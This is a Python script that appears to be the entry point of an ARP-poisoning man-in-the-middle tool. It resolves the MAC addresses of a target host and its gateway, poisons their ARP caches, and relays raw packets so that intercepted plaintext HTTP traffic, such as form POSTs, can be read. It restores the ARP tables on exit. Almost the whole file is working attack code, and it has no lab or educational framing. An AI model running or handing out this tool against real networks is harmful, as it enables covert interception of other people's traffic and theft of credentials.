import os
import signal
import socket
import sys
import threading

from constans import *
from helpers import *
from poisoner import *
from relay import *


def main():
    if os.geteuid() != 0:
        sys.exit("Raw sockets need root: run with sudo.")

    attacker_mac = mac_bytes(ATTACKER_MAC) if ATTACKER_MAC \
        else mac_bytes(iface_mac(IFACE))

    if TARGET_MAC:
        target_mac = mac_bytes(TARGET_MAC)
    else:
        print("[*] resolving target %s ..." % TARGET_IP)
        try:
            target_mac = mac_bytes(resolve_mac(IFACE, TARGET_IP))
        except RuntimeError:
            print("[!] target did not answer ARP, using known MAC %s"
                  % KNOWN_TARGET_MAC)
            target_mac = mac_bytes(KNOWN_TARGET_MAC)

    if GATEWAY_MAC:
        gateway_mac = mac_bytes(GATEWAY_MAC)
    else:
        print("[*] resolving gateway %s ..." % GATEWAY_IP)
        gateway_mac = mac_bytes(resolve_mac(IFACE, GATEWAY_IP))

    stop = threading.Event()
    poison_set = PoisonSet(IFACE, attacker_mac, TARGET_IP, target_mac, stop)
    poison_set.add(GATEWAY_IP, gateway_mac)

    for ip in EXTRA_UPSTREAMS:
        try:
            mac = mac_bytes(resolve_mac(IFACE, ip))
        except RuntimeError:
            print("[!] cannot resolve %s, skipping" % ip)
            continue
        poison_set.add(ip, mac)

    own_ip = iface_ip(IFACE)
    print("[*] interface    : %s" % IFACE)
    print("[*] attacker MAC : %s" % mac_str(attacker_mac))
    print("[*] target       : %s  (%s)" % (TARGET_IP, mac_str(target_mac)))
    print("[*] gateway      : %s  (%s)" % (GATEWAY_IP, mac_str(gateway_mac)))
    print("[*] this machine : %s" % own_ip)
    print("[*] display filter: IP=%s  ports=%s  (relay is unfiltered)"
          % (FILTER_IP,
             "all" if FILTER_PORTS is None else
             ",".join(str(p) for p in sorted(FILTER_PORTS))))
    print("[*] web server on this machine? POSTs show as 'client -> server (local)'.")
    print("[*] web server on another LAN host? add it to EXTRA_UPSTREAMS")
    print("    (or wait for the target's ARP request and it is learned live).")
    print("[*] note: only plaintext HTTP is readable; 443 is encrypted.")
    print("[*] poisoning ARP caches, relaying traffic. Ctrl+C to stop.\n")

    relay_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                               socket.htons(ETH_P_ALL))
    relay_sock.bind((IFACE, 0))
    relay_sock.settimeout(1.0)
    try:
        relay_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
    except OSError:
        pass

    def on_signal(signum, _frame):
        stop.set()

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    try:
        run_relay(relay_sock, IFACE, attacker_mac, TARGET_IP, target_mac,
                  gateway_mac, poison_set, stop)
    finally:
        stop.set()
        poison_set.stop_all()
        print("\n[*] restoring ARP tables ...")
        restore(IFACE, target_mac, TARGET_IP, poison_set.items())
        relay_sock.close()
        print("[*] done.")


if __name__ == "__main__":
    main()
